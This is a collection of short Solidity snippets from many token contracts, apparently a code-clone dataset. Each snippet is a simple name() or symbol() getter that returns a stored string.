<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="70" endline="72" pcid="7713">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="50" endline="52" pcid="3800">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="52" endline="54" pcid="1046">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="67" endline="69" pcid="6869">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="70" endline="72" pcid="1445">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="54" endline="56" pcid="156">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="66" endline="68" pcid="96">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="66" endline="68" pcid="8183">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="50" endline="52" pcid="5860">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="51" endline="53" pcid="5921">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="66" endline="68" pcid="7621">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="67" endline="69" pcid="3223">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="130" endline="132" pcid="3514">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="51" endline="53" pcid="8375">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="70" endline="72" pcid="6566">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="51" endline="53" pcid="7925">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="53" endline="55" pcid="3249">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="80" endline="82" pcid="7728">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="54" endline="56" pcid="1637">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="54" endline="56" pcid="459">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="54" endline="56" pcid="1678">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="55" endline="57" pcid="5972">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="64" endline="66" pcid="4887">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="51" endline="53" pcid="1127">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="53" endline="55" pcid="8047">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="54" endline="56" pcid="2091">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="69" endline="71" pcid="6763">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x39Fd4791fC181B9889397101E644460705aA11d0.sol" startline="35" endline="37" pcid="1939">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="48" endline="50" pcid="1426">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="70" endline="72" pcid="6611">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="68" endline="70" pcid="3058">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="54" endline="56" pcid="9225">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="70" endline="72" pcid="804">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="125" endline="127" pcid="610">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="54" endline="56" pcid="7536">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="55" endline="57" pcid="5685">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="47" endline="49" pcid="2716">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="50" endline="52" pcid="8450">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="55" endline="57" pcid="8703">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="67" endline="69" pcid="4255">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="53" endline="55" pcid="6161">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="65" endline="67" pcid="6349">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="53" endline="55" pcid="4853">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x24982c94a024e5fb32eba94eda02404a89dadaef.sol" startline="44" endline="46" pcid="1120">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="68" endline="70" pcid="4491">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="54" endline="56" pcid="4943">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="379" endline="381" pcid="6403">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="67" endline="69" pcid="6685">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="72" endline="74" pcid="5062">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="470" endline="472" pcid="1991">
    function name() public view returns (string memory) {
      return _name;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="70" endline="72" pcid="7067">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="53" endline="55" pcid="3069">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="70" endline="72" pcid="4155">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="71" endline="73" pcid="5976">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="55" endline="57" pcid="2654">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="54" endline="56" pcid="4656">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="51" endline="53" pcid="660">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="386" endline="388" pcid="6404">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="53" endline="55" pcid="3663">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="54" endline="56" pcid="7709">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="70" endline="72" pcid="9361">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="66" endline="68" pcid="1309">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="53" endline="55" pcid="8528">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="49" endline="51" pcid="892">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="51" endline="53" pcid="6300">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="53" endline="55" pcid="2131">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="34" endline="36" pcid="3847">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="68" endline="70" pcid="2643">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="52" endline="54" pcid="3054">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="54" endline="56" pcid="4151">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="72" endline="74" pcid="1865">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="67" endline="69" pcid="8334">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="70" endline="72" pcid="4706">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x95b34d9c10e8569d9fd1e08001cfd84a59226ab9.sol" startline="48" endline="50" pcid="5458">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="67" endline="69" pcid="5879">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="70" endline="72" pcid="1370">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="66" endline="68" pcid="360">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="48" endline="50" pcid="4998">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="66" endline="68" pcid="2991">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="54" endline="56" pcid="1827">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="54" endline="56" pcid="7063">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="51" endline="53" pcid="1544">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="71" endline="73" pcid="9129">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="50" endline="52" pcid="5494">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="70" endline="72" pcid="1400">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="69" endline="71" pcid="7037">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="68" endline="70" pcid="5216">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="56" endline="58" pcid="6195">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="51" endline="53" pcid="9273">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="67" endline="69" pcid="5659">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="69" endline="71" pcid="4857">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="50" endline="52" pcid="590">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="71" endline="73" pcid="2050">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="139" endline="141" pcid="3816">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="69" endline="71" pcid="6778">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="140" endline="142" pcid="7364">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="66" endline="68" pcid="8454">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="69" endline="71" pcid="5910">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="394" endline="396" pcid="9313">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="69" endline="71" pcid="227">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="67" endline="69" pcid="8379">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="50" endline="52" pcid="6534">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="71" endline="73" pcid="2658">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="70" endline="72" pcid="6643">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="68" endline="70" pcid="4107">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="68" endline="70" pcid="4727">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="69" endline="71" pcid="9331">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="70" endline="72" pcid="4645">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="52" endline="54" pcid="5605">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="390" endline="392" pcid="3692">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="65" endline="67" pcid="8394">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="51" endline="53" pcid="5875">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="67" endline="69" pcid="9277">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="51" endline="53" pcid="5013">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="50" endline="52" pcid="4057">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="57" endline="59" pcid="6624">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="70" endline="72" pcid="7576">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="50" endline="52" pcid="3880">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="51" endline="53" pcid="7498">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="51" endline="53" pcid="2355">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="67" endline="69" pcid="533">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="71" endline="73" pcid="1509">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="50" endline="52" pcid="3901">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="53" endline="55" pcid="8877">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="51" endline="53" pcid="3144">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="51" endline="53" pcid="5073">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="50" endline="52" pcid="8987">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="53" endline="55" pcid="3204">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="52" endline="54" pcid="5351">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="67" endline="69" pcid="5017">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="66" endline="68" pcid="4302">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="69" endline="71" pcid="8532">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="71" endline="73" pcid="4742">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="67" endline="69" pcid="2065">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="68" endline="70" pcid="548">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="73" endline="75" pcid="8198">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="64" endline="66" pcid="4363">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="69" endline="71" pcid="2288">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="53" endline="55" pcid="303">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="48" endline="50" pcid="3723">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="50" endline="52" pcid="1960">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="70" endline="72" pcid="1563">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="68" endline="70" pcid="9159">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="66" endline="68" pcid="5403">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="66" endline="68" pcid="2822">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="70" endline="72" pcid="4675">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="69" endline="71" pcid="2016">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="70" endline="72" pcid="6895">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="142" endline="144" pcid="1093">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="69" endline="71" pcid="3667">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="51" endline="53" pcid="8330">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="47" endline="49" pcid="2229">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="69" endline="71" pcid="8881">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="65" endline="67" pcid="6482">
    function name() public view returns (string memory) {
        return _NFTName;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="381" endline="383" pcid="8508">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="51" endline="53" pcid="3922">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="65" endline="67" pcid="5674">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="68" endline="70" pcid="2867">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
